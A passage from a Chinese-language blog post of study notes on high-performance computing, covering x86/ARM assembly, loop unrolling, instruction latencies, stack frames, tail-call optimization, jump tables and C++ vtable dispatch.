<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;arm</span><br><span class="line">; *a = x0, *b = x1, *c = x2</span><br><span class="line">ldr w0, [x0]    ; load 4 bytes from wherever x0 points into w0</span><br><span class="line">ldr w1, [x1]    ; load 4 bytes from wherever x1 points into w1</span><br><span class="line">add w0, w0, w1  ; add w0 with w1 and save the result to w0</span><br><span class="line">str w0, [x2]    ; write contents of w0 to wherever x2 points</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;x86</span><br><span class="line">; *a = rsi, *b = rdi, *c = rdx </span><br><span class="line">mov eax, DWORD PTR [rsi]  ; load 4 bytes from wherever rsi points into eax</span><br><span class="line">add eax, DWORD PTR [rdi]  ; add whatever is stored at rdi to eax</span><br><span class="line">mov DWORD PTR [rdx], eax  ; write contents of eax to wherever rdx points</span><br></pre></td></tr></table></figure></div>
<p>我们能发现x86版本加法操作和内存加载在一条指令中同时进行，避免了额外的内存加载指令，这就可以用更少的指令实现更多的功能。而arm代表的RISC架构也有其优点，虽然每个指令只能完成一个操作，但可以通过高效的硬件流水线和指令并行执行来提高总体性能。</p>
<p>后续我们都以x86架构举例：</p>
<p>64、32、16以及8位寄存器的区别一般就体现在名字上（rax,eax,ax,al），其本质上就是使用某个寄存器的低位实现更少位数的寄存器。</p>
<p>寄存器一般分为通用寄存器，浮点寄存器，向量扩展寄存器以及特殊寄存器。向量扩展寄存器通常比普通的通用寄存器要宽，能够存储更多的数据。例如，现代的 x86 CPU 使用 <code>xmm</code> 寄存器来存储 128 位的数据，而 <code>ymm</code> 寄存器则存储 256 位的数据。</p>
<p>立即数就是在指令中出现的一些数字，一般而言会直接嵌入到机器码中，但这无疑增加了机器编码的复杂度，所以有些指令只能使用部分立即数，或者是不能用立即数（只能先加载到寄存器中再进行操作）。</p>
<p>当我们进行数据复制时，比如用mov指令，实际上是一个告诉CPU寄存器更名的过程，由于寄存器重命名的方式，<code>mov</code> 指令不会在 CPU 内部花费额外的时间来复制数据。现代 CPU 在执行指令时，会在内部使用一种称为<strong>重命名表（Rename Table）</strong>的结构来跟踪寄存器的实际数据位置。当你执行 <code>mov</code> 指令时，CPU 只是更新寄存器映射表，而不进行数据的实际传输。这种操作通常不需要多余的时钟周期，只会消耗一个解码周期（即处理这条指令本身的时间）。<code>xchg</code>指令同理。</p>
<p>地址模式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SIZE PTR [base + index * scale + displacement]</span><br></pre></td></tr></table></figure></div>
<p>SIZE可以是BYTE,WORD,DWORD以及QWORD，分别对应着1个字节，2个字节，4个字节和8个字节。</p>
<p><strong>scale只能是 1, 2, 4, 或 8</strong>。</p>
<p>地址操作一般会用到<code>lea</code>指令，其功能如下：</p>
<ul>
<li><p><strong>计算有效地址</strong>：<code>lea</code> 指令的主要用途是计算一个内存地址，并将其存储到寄存器中。它不涉及任何实际的内存访问，仅仅是在计算过程中生成内存地址。通常这用于计算复杂的地址，例如数组的偏移。</p>
<p>例如，<code>lea eax, [ebx + 4*ecx]</code> 计算的是 <code>ebx + 4 * ecx</code> 的结果，并将该结果存入 <code>eax</code> 中。这条指令只是计算地址，并没有实际访问 <code>ebx + 4*ecx</code> 所指向的内存位置。</p>
</li>
</ul>
<p><code>lea</code>除了能获取地址，还能作为算术运算的优化工具</p>
<ul>
<li><p><strong>替代乘法和加法</strong>：<code>lea</code> 指令还常被作为一个算术优化技巧来替代乘法和加法运算，尤其在需要计算偏移量时非常有用。比如，乘以 3、5 或 9 的运算，可以通过 <code>lea</code> 来实现，避免了直接使用乘法指令（<code>mul</code>）的成本。</p>
<p>例如，如果你需要做 <code>a = b * 3</code>，你通常需要先进行 <code>a = b + b + b</code> 或使用乘法指令。但使用 <code>lea</code> 可以在一条指令中完成相同的计算：<code>lea eax, [ebx + ebx*2]</code>（这里 <code>ebx*2</code> 就是加法的一种优化）。这样就避免了乘法指令，改用了 <code>lea</code>。</p>
</li>
</ul>
<p>作为替代 <code>add</code> 的工具</p>
<ul>
<li><p><strong><code>lea</code> 替代 <code>add</code></strong>：<code>lea</code> 也常常作为 <code>add</code> 指令的替代，尤其是在需要执行多个加法操作时。<code>lea</code> 不需要单独的 <code>mov</code> 指令来保存结果，因为它可以直接将计算结果存入指定寄存器。</p>
<p>例如，假设你有：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">add eax, ebx</span><br><span class="line">add eax, ecx</span><br></pre></td></tr></table></figure></div>
<p>这两条指令会将 <code>ebx</code> 和 <code>ecx</code> 加到 <code>eax</code> 上。但是，如果你使用 <code>lea</code>，你可以避免使用第二条 <code>add</code> 指令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea eax, [ebx + ecx]</span><br></pre></td></tr></table></figure></div>
<p>这条指令会直接将 <code>ebx + ecx</code> 的结果存入 <code>eax</code>，节省了一条 <code>add</code> 指令。通过 <code>lea</code>，你甚至可以在一条指令中执行多个加法运算（如 <code>a = b + c + d</code>），避免了额外的 <code>mov</code> 操作。</p>
</li>
</ul>
<p>上述使用的都是x86汇编的<strong>Intel 语法</strong>，实际上还存在一种<strong>AT&amp;T 语法</strong></p>
<p><strong>AT&amp;T 语法的特点</strong></p>
<ul>
<li><strong>操作数顺序</strong>：在 AT&amp;T 语法中，目标操作数（目的地）在后面，源操作数在前面。例如：<code>movl (%rsi), %eax</code>，意思是将 <code>rsi</code> 寄存器指向的地址中的数据移动到 <code>eax</code> 寄存器。</li>
<li><strong>寄存器和常量的前缀</strong>：在 AT&amp;T 语法中，寄存器需要使用 <code>%</code> 前缀（例如 <code>%eax</code>），常量需要使用 <code>$</code> 前缀（例如 <code>$1</code>）。</li>
<li><strong>内存寻址模式</strong>：AT&amp;T 语法中的内存寻址模式是 <code>displacement(%base, %index, scale)</code>，例如 <code>movl 4(%eax, %ebx, 2), %ecx</code> 表示从 <code>eax + ebx * 2 + 4</code> 位置读取数据。</li>
<li>操作数大小后缀：在 AT&amp;T 语法中，操作指令后有大小后缀，表示操作数的大小。常见的后缀有：<ul>
<li><code>b</code>：字节（8位）</li>
<li><code>w</code>：字（16位）</li>
<li><code>l</code>：长整型（32位整数或64位浮动点）</li>
<li><code>q</code>：四倍长（64位）</li>
<li><code>s</code>：单精度浮点数（32位）</li>
<li><code>t</code>：十字节（80位浮动点数）</li>
</ul>
</li>
</ul>
<p>实现<code>*c = *a + *b</code>方式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl (%rsi), %eax</span><br><span class="line">addl (%rdi), %eax</span><br><span class="line">movl %eax, (%rdx)</span><br></pre></td></tr></table></figure></div>
<h5 id="循环与条件"><a href="#循环与条件" class="headerlink" title="循环与条件"></a>循环与条件</h5><p>循环主要通过跳转指令实现。</p>
<ol>
<li><strong>跳转指令的作用</strong></li>
</ol>
<p>跳转指令（如 <code>jmp</code>）的作用是将程序的指令指针（IP）移动到一个新的地址，这个地址由跳转指令的操作数来指定。跳转的目标地址有以下几种可能：</p>
<ul>
<li><strong>绝对地址</strong>：跳转到一个固定的内存地址。</li>
<li><strong>相对地址</strong>：跳转到一个相对当前指令位置的地址（例如，跳转前进或后退一定的字节数）。</li>
<li><strong>运行时计算的地址</strong>：这个地址不是在编译时固定的，而是在程序运行时计算得到。</li>
</ul>
<ol>
<li><strong>标签的使用</strong></li>
</ol>
<p>为了避免直接管理这些地址，汇编程序员可以使用 <strong>标签</strong>。标签是指用一个字符串标记某个指令的位置，并且这个字符串在机器代码生成时会被替换成相对地址。例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">    ; 这里是某个指令</span><br><span class="line">    jmp start  ; 跳转回start标签的位置</span><br></pre></td></tr></table></figure></div>
<p>在上面的例子中，<code>start:</code> 是一个标签，指示 <code>jmp</code> 指令跳转到这个标签的位置。这个标签的实际地址会在编译时被替换为相对地址。</p>
<ol>
<li><strong>标签的命名规则</strong></li>
</ol>
<p>标签的命名并不复杂。通常，编译器会使用一些规则来生成标签名称：</p>
<ul>
<li><strong>行号</strong>：编译器可能会使用源代码的行号来生成标签的名称。</li>
<li><strong>函数名</strong>：有时，标签会以函数名作为基础，并附加签名信息来标识不同的位置。</li>
</ul>
<p>这种标签命名方式使得标签的管理变得更清晰，也方便了编译器自动生成跳转目标。</p>
<p>但是单独的往回跳的jmp只会形成类似<code>while(True)</code>的死循环，我们还需搭配条件控制来进行设计循环的边界。</p>
<p>一般是利用FLAGS寄存器来保存比较状态，然后通过该状态来决定是否跳转，常见条件跳转指令有<code>je</code>、<code>jne</code>、<code>ja</code>、<code>jna</code>、<code>jb</code>、<code>jnb</code>等。</p>
<h5 id="循环展开（Loop-Unrolling）"><a href="#循环展开（Loop-Unrolling）" class="headerlink" title="循环展开（Loop Unrolling）"></a>循环展开（<a class="link"   href="https://en.wikipedia.org/wiki/Loop_unrolling" >Loop Unrolling<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>）</h5><p>由于我们用于循环的指令占一定的长度（循环变量迭代、比较、判断跳转），我们有时候可以通过人为的增加步长并补充必要的有效指令来增加指令的效率，例子如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;before optimization</span><br><span class="line">loop:</span><br><span class="line">    add  edx, DWORD PTR [rax]</span><br><span class="line">    add  rax, 4</span><br><span class="line">    cmp  rax, rcx</span><br><span class="line">    jne  loop</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;after optimization</span><br><span class="line">loop:</span><br><span class="line">    add  edx, [rax]</span><br><span class="line">    add  edx, [rax+4]</span><br><span class="line">    add  edx, [rax+8]</span><br><span class="line">    add  edx, [rax+12]</span><br><span class="line">    add  rax, 16</span><br><span class="line">    cmp  rax, rcx</span><br><span class="line">    jne  loop</span><br></pre></td></tr></table></figure></div>
<p>比如我们在遍历一个拥有16个int元素的数组进行求和，我们忽略每个指令实际执行的时间周期花费差异，第一种方法需要16<em>4=64次指令执行，而第二种方式只用4\</em>7=28次指令执行即可，看上去效率提高了很多。但实际上循环展开不一定带来预期的性能提升，因为现代处理器并不是按顺序一条条执行指令，而是会维护一个指令队列，允许 <strong>并行执行独立的操作</strong>。这意味着如果两条指令之间没有依赖关系（即它们的执行结果互不影响），处理器可以将它们同时执行，而不需要等待其中一个完成后再执行另一个。</p>
<p>另一种可能的优化思路是利用某些指令的副作用来进行FLAGS位寄存器的设置，从而优化掉cmp的使用。比如利用add结束后会进行的状态设置。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    mov  rax, -100  ; replace 100 with the array size</span><br><span class="line">loop:</span><br><span class="line">    add  edx, DWORD PTR [rax + 100 + rcx]</span><br><span class="line">    add  rax, 4</span><br><span class="line">    jnz  loop       ; checks if the result is zero</span><br></pre></td></tr></table></figure></div>
<h5 id="常用指令花费"><a href="#常用指令花费" class="headerlink" title="常用指令花费"></a>常用指令花费</h5><p><strong>x86 常用指令延迟列表（Latency &amp; Throughput）</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>延迟（Latency）</th>
<th>吞吐量（Throughput）</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>add r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>加法</td>
</tr>
<tr>
<td><code>sub r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>减法</td>
</tr>
<tr>
<td><code>and r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>按位与</td>
</tr>
<tr>
<td><code>or r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>按位或</td>
</tr>
<tr>
<td><code>xor r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>按位异或</td>
</tr>
<tr>
<td><code>cmp r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>比较（影响标志位）</td>
</tr>
<tr>
<td><code>test r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>逻辑测试（仅设置标志位）</td>
</tr>
<tr>
<td><code>mov r, r/m</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>纯寄存器操作的 <code>mov</code></td>
</tr>
<tr>
<td><code>mov r, imm</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>立即数赋值</td>
</tr>
<tr>
<td><code>mov r/m, r</code></td>
<td><strong>2-3 cycles</strong></td>
<td>0.5 per cycle</td>
<td>可能涉及内存访问</td>
</tr>
<tr>
<td><code>lea r, [r + r*m + c]</code></td>
<td><strong>1-3 cycles</strong></td>
<td>1 per cycle</td>
<td>计算地址，但不访问内存</td>
</tr>
<tr>
<td><code>imul r, r/m</code></td>
<td><strong>3 cycles</strong></td>
<td>1 per 1-3 cycles</td>
<td>有符号整数乘法</td>
</tr>
<tr>
<td><code>mul r/m</code></td>
<td><strong>3-4 cycles</strong></td>
<td>1 per 2-3 cycles</td>
<td>无符号整数乘法</td>
</tr>
<tr>
<td><code>idiv r/m</code></td>
<td><strong>22-30 cycles</strong></td>
<td>1 per 20+ cycles</td>
<td>有符号整数除法（非常慢）</td>
</tr>
<tr>
<td><code>div r/m</code></td>
<td><strong>22-30 cycles</strong></td>
<td>1 per 20+ cycles</td>
<td>无符号整数除法（非常慢）</td>
</tr>
<tr>
<td><code>sar r/m, imm</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>算术右移</td>
</tr>
<tr>
<td><code>shl r/m, imm</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>逻辑左移</td>
</tr>
<tr>
<td><code>shr r/m, imm</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>逻辑右移</td>
</tr>
<tr>
<td><code>neg r/m</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>取负数</td>
</tr>
<tr>
<td><code>not r/m</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>取反</td>
</tr>
<tr>
<td><code>cmovcc r, r/m</code></td>
<td><strong>2 cycles</strong></td>
<td>1 per cycle</td>
<td>条件移动（消除分支预测）</td>
</tr>
<tr>
<td><code>jcc label</code>（预测正确）</td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>预测正确的跳转</td>
</tr>
<tr>
<td><code>jcc label</code>（预测错误）</td>
<td><strong>~15 cycles</strong></td>
<td>-</td>
<td>预测错误会导致流水线清空</td>
</tr>
<tr>
<td><code>call label</code></td>
<td><strong>4-5 cycles</strong></td>
<td>-</td>
<td>调用函数（压栈）</td>
</tr>
<tr>
<td><code>ret</code></td>
<td><strong>3-4 cycles</strong></td>
<td>-</td>
<td>返回（弹栈）</td>
</tr>
</tbody>
</table>
</div>
<h4 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h4><p>rsp存栈顶，rbp存栈底。</p>
<p>栈帧操作所用到的call，ret，push，pop，leave等实际是一种语法糖，其本身可以被拆解为不同的指令组合。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; &quot;push rax&quot;</span><br><span class="line">sub rsp, 8</span><br><span class="line">mov QWORD PTR[rsp], rax</span><br><span class="line"></span><br><span class="line">; &quot;pop rax&quot;</span><br><span class="line">mov rax, QWORD PTR[rsp]</span><br><span class="line">add rsp, 8</span><br><span class="line"></span><br><span class="line">; &quot;call func&quot;</span><br><span class="line">push rip ; &lt;- instruction pointer (although accessing it like that is probably illegal)</span><br><span class="line">jmp func</span><br><span class="line"></span><br><span class="line">; &quot;ret&quot;</span><br><span class="line">pop  rcx ; &lt;- choose any unused register</span><br><span class="line">jmp rcx</span><br><span class="line"></span><br><span class="line">; &quot;leave&quot;</span><br><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure></div>
<h4 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h4><p><strong>传递参数</strong>：如 <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code> 等寄存器（对于更多的参数，可能会使用栈传递）。</p>
<p><strong>返回值</strong>：函数返回值通常存储在 <code>rax</code> 寄存器中。</p>
<p><strong>堆栈管理</strong>：在调用其他函数时，通常需要通过 <code>push</code> 和 <code>pop</code> 指令保存和恢复寄存器的内容，以确保函数之间的参数和返回值不会冲突。</p>
<p>每次函数调用时，都可能需要保存寄存器（如 <code>push</code> 和 <code>pop</code>）以及将参数放入寄存器中，尤其是当调用多个函数时，这会增加额外的指令开销。频繁的函数调用，尤其是在性能要求很高的场景中，可能会引入一定的性能损失。</p>
<h4 id="内联优化"><a href="#内联优化" class="headerlink" title="内联优化"></a>内联优化</h4><p><strong>内联优化</strong>（Inline optimization）是编译器用来提高程序运行效率的一种优化手段。内联优化通过将函数调用替换成函数体的代码，来避免函数调用的开销，从而提高程序的执行效率。</p>
<p>在 C++ 中，内联函数是通过使用 <code>inline</code> 关键字声明的函数。编译器在编译时，会将内联函数的代码直接插入到调用该函数的地方，而不是生成函数调用的代码。这样就避免了常规函数调用的开销（如栈的操作、跳转等）。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">square</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在这个例子中，<code>square</code> 函数会在每次调用时直接将其代码插入到调用点，而不是像普通函数那样产生函数调用的开销。</p>
<p><strong>内联函数的好处</strong></p>
<ol>
<li><strong>减少函数调用的开销</strong>：普通函数调用涉及到参数传递、栈帧的创建、跳转等，内联函数直接替代了函数调用过程，避免了这些开销。</li>
<li><strong>提高执行速度</strong>：减少了栈操作和跳转，代码更紧凑，从而提高了执行速度。</li>
<li><strong>减少代码重复</strong>：内联函数可以避免重复编写相同的代码块，增强了代码的复用性。</li>
</ol>
<h4 id="尾调用优化"><a href="#尾调用优化" class="headerlink" title="尾调用优化"></a>尾调用优化</h4><p>让我们考虑一个更加复杂的情况，也就是递归调用。</p>
<p><strong>尾递归优化</strong>（Tail Call Elimination, TCE）是一种优化技术，它的目的是将尾递归函数转换为迭代（loop），从而避免每次递归调用时额外的栈空间开销。尾递归是指函数调用自己并且在递归调用之后没有其他计算操作，递归的返回值直接就是递归调用的结果。</p>
<p>首先，考虑一个常见的递归阶乘函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">factorial</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> factorial(n - <span class="number">1</span>) * n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在这种递归实现中，每次递归调用都需要等待 <code>factorial(n - 1)</code> 计算完成后才进行乘法运算。这个递归调用没有进行尾递归优化，因此每次递归都需要保存返回地址、参数等信息到栈上，直到递归完成才开始计算结果。</p>
<p><strong>对应的汇编实现</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; n = edi, ret = eax</span><br><span class="line">factorial:</span><br><span class="line">    test edi, edi       ; 判断 n 是否为零</span><br><span class="line">    jne  nonzero        ; 如果 n 不为零，跳转到 nonzero</span><br><span class="line">    mov  eax, 1         ; 如果 n 为零，返回 1</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">nonzero:</span><br><span class="line">    push edi            ; 保存 n，用于后续的乘法</span><br><span class="line">    sub  edi, 1         ; n - 1</span><br><span class="line">    call factorial      ; 递归调用 factorial(n - 1)</span><br><span class="line">    pop  edi            ; 恢复 n</span><br><span class="line">    imul eax, edi       ; 将结果乘以 n</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></div>
<p>这个实现是典型的递归形式，每次递归都会保存当前的 <code>n</code> 到栈中，并在递归返回后进行乘法操作。随着递归深度的增加，这会消耗大量的栈空间（push和call分别都会往栈上存1个地址的内容）。</p>
<p><strong>尾递归优化</strong></p>
<p>如果函数是<strong>尾递归</strong>的（即递归调用之后没有其他操作），我们就可以将递归调用转化为一个循环，这样就避免了递归带来的栈开销。比如我们可以通过引入一个累积参数 <code>p</code> 来进行尾递归优化：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">factorial</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> p = <span class="number">1</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    <span class="keyword">return</span> factorial(n - <span class="number">1</span>, p * n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在这个版本中，我们传入一个参数 <code>p</code> 来存储当前的乘积。当 <code>n</code> 为 0 时，直接返回 <code>p</code>。这就避免了递归调用之后的乘法操作，变成了一个可以优化为循环的尾递归。</p>
<p><strong>优化后的汇编实现（尾递归转循环）</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 假设 n &gt; 0</span><br><span class="line">factorial:</span><br><span class="line">    mov  eax, 1         ; 将 eax 初始化为 1（当前乘积）</span><br><span class="line">loop:</span><br><span class="line">    imul eax, edi       ; eax = eax * edi（乘以 n）</span><br><span class="line">    sub  edi, 1         ; n = n - 1</span><br><span class="line">    jne  loop           ; 如果 n != 0，继续循环</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></div>
<p>在这个实现中，递归调用被替换成了一个循环。每次循环将当前值 <code>edi</code>（即 n）乘以当前的乘积（存储在 <code>eax</code> 中），然后递减 <code>edi</code>，直到 <code>edi</code> 为 0 时结束。</p>
<p><strong>尾递归优化的好处</strong></p>
<ol>
<li><strong>节省栈空间</strong>：尾递归优化的关键是消除每次递归调用的栈开销。传统递归调用每次都会往栈上压入返回地址、参数等信息，而尾递归优化后，递归实际上被转换成了循环，循环本身不需要额外的栈空间。</li>
<li><strong>提高执行效率</strong>：去除了递归调用的开销，避免了函数调用和返回的上下文切换。循环执行通常比递归调用更高效，尤其是在递归深度较大的情况下。</li>
</ol>
<h4 id="间接分支"><a href="#间接分支" class="headerlink" title="间接分支"></a>间接分支</h4><p>在汇编中，所有标签都会转换成绝对或者相对地址然后嵌入指令的机器码中。</p>
<h5 id="多路分支"><a href="#多路分支" class="headerlink" title="多路分支"></a>多路分支</h5><p>对于n路分支，一般不会直接创建n个分支，而是创建一个分支函数表来进行定位。switch指令有时候并不能让编译器方便的进行优化，所以像glibc中有关IO部分的实现，一般都会用到goto指令直接跳转。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">weather_in_russia</span><span class="params">(<span class="type">int</span> season)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">void</span>* table[] = &#123;&amp;&amp;winter, &amp;&amp;spring, &amp;&amp;summer, &amp;&amp;fall&#125;;</span><br><span class="line">    <span class="keyword">goto</span> *table[season];</span><br><span class="line"></span><br><span class="line">    winter:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freezing\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    spring:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dirty\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    summer:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dry\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    fall:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Windy\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="动态分发（Dynamic-Dispatch）"><a href="#动态分发（Dynamic-Dispatch）" class="headerlink" title="动态分发（Dynamic Dispatch）"></a>动态分发（Dynamic Dispatch）</h5><p><strong>动态分发</strong>是实现运行时多态性（runtime polymorphism）的核心技术，尤其在面向对象编程中非常常见。它允许程序在运行时决定调用哪个具体方法，而不是在编译时确定。这种特性使得基于继承和多态的代码结构能够在不同类型的对象上以相同的接口进行操作。</p>
<p>考虑一个经典的例子，我们有一个 <code>Animal</code> 抽象类，其中有一个虚拟的 <code>speak()</code> 方法，以及两个具体实现类：<code>Dog</code> 和 <code>Cat</code>。每个具体类实现了自己的 <code>speak()</code> 方法，<code>Dog</code> 发出 “Bark”，<code>Cat</code> 发出 “Meow”。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">speak</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;&lt;abstract animal sound&gt;\n&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Dog</span> : <span class="keyword">public</span> Animal &#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;Bark\n&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Cat</span> : <span class="keyword">public</span> Animal &#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;Meow\n&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><strong>创建对象并调用方法</strong></p>
<p>我们希望创建一个 <code>Animal</code> 类型的指针，指向不同的具体对象（<code>Dog</code> 或 <code>Cat</code>），并通过这个指针调用 <code>speak()</code> 方法，而无需在编译时明确知道它指向的是 <code>Dog</code> 还是 <code>Cat</code>。这样，我们可以通过动态分发来调用适当的实现。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    Dog sparkles;</span><br><span class="line">    Cat mittens;</span><br><span class="line">    </span><br><span class="line">    Animal* catdog = (<span class="built_in">rand</span>() &amp; <span class="number">1</span>) ? <span class="built_in">static_cast</span>&lt;Animal*&gt;(&amp;sparkles) : <span class="built_in">static_cast</span>&lt;Animal*&gt;(&amp;mittens);</span><br><span class="line">    catdog-&gt;<span class="built_in">speak</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里我们拿g++编译后的文件扔到IDA里看看，就会发现使用到了vtable来管理函数指针。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/image-20250226203831161.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/image-20250226204059941.png"
                      class=""
                >
<p><strong>如何实现动态分发</strong></p>
<p>在 C++ 中，动态分发是通过<strong>虚拟方法表</strong>（<strong>vtable</strong>）来实现的。下面是它是如何工作的：</p>
<ol>
<li><strong>虚拟方法表</strong>（Vtable）：对于每个实现了虚拟方法的类，编译器会为这个类生成一个虚拟方法表，这个表中包含了该类的所有虚拟方法的地址。表中的每个条目对应类中的一个虚拟方法。</li>
<li><strong>虚拟方法表指针</strong>：每个类的实例都会有一个指向其虚拟方法表的指针（通常叫做 vptr）。当你通过 <code>Animal*</code> 指针调用 <code>speak()</code> 方法时，程序会使用该指针的 <code>vptr</code> 来查找正确的虚拟方法表，并从中提取出 <code>speak()</code> 的实际地址。</li>
<li><strong>调用虚拟方法</strong>：程序根据对象的 <code>vptr</code> 查找虚拟方法表，从表中找到对应的 <code>speak()</code> 方法地址，然后跳转到该地址执行相应的代码。</li>
</ol>
<p><strong>虚拟方法表的实现细节</strong></p>
